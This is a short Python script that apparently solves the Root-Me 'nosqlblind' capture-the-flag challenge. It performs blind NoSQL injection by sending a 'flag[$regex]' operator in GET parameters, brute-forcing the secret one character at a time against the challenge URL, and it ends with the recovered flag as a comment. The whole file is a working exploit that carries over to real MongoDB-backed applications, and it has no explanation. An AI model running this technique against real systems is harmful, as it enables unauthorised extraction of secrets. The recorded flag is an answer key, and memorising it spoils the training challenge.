import requests 
import string

s  = string.ascii_letters + string.digits + "{}_@$"
print(s)

url = "http://challenge01.root-me.org/web-serveur/ch48/index.php"
flag = list("")
while True:
	for i in s:
		payload = {
		           'chall_name':'nosqlblind', 
		           'flag[$regex]':  '^{}'.format("".join(flag)+str(i))
		}
		# print(payload)

		r = requests.get(url, params=payload)
		if("This is not a valid flag for the nosqlblind challenge..." in r.text):
			pass
		else:
			flag.append(i)
			print("".join(flag))
			break

# 3@sY_n0_5q7_1nj3c710n
